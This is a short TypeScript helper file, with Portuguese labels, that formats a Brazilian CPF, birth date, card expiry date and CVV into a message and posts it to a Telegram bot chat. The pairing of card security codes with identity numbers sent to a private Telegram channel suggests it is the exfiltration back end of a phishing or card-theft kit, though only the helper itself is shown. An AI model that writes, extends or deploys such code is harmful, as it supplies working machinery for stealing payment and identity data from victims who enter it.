// Telegram API helper functions

interface TelegramMessage {
  routeName: string
  cpf: string
  birthDate?: string
  cardExpiry?: string
  cvv?: string
  timestamp: string
}

export async function sendToTelegram(
  botToken: string,
  chatId: string,
  data: TelegramMessage
): Promise<{ success: boolean; error?: string }> {
  const message = formatTelegramMessage(data)
  
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      }
    )

    const result = await response.json()

    if (!result.ok) {
      return {
        success: false,
        error: result.description || 'Erro ao enviar mensagem',
      }
    }

    return { success: true }
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Erro desconhecido',
    }
  }
}

function formatTelegramMessage(data: TelegramMessage): string {
  const lines = [
    `<b>Nova Solicitação - ${data.routeName}</b>`,
    ``,
    `<b>CPF:</b> ${data.cpf}`,
  ]

  if (data.birthDate) {
    lines.push(`<b>Data de Nascimento:</b> ${data.birthDate}`)
  }

  if (data.cardExpiry) {
    lines.push(`<b>Validade do Cartão:</b> ${data.cardExpiry}`)
  }

  if (data.cvv) {
    lines.push(`<b>CVV:</b> ${data.cvv}`)
  }

  lines.push(``)
  lines.push(`<b>Data/Hora:</b> ${data.timestamp}`)

  return lines.join('\n')
}
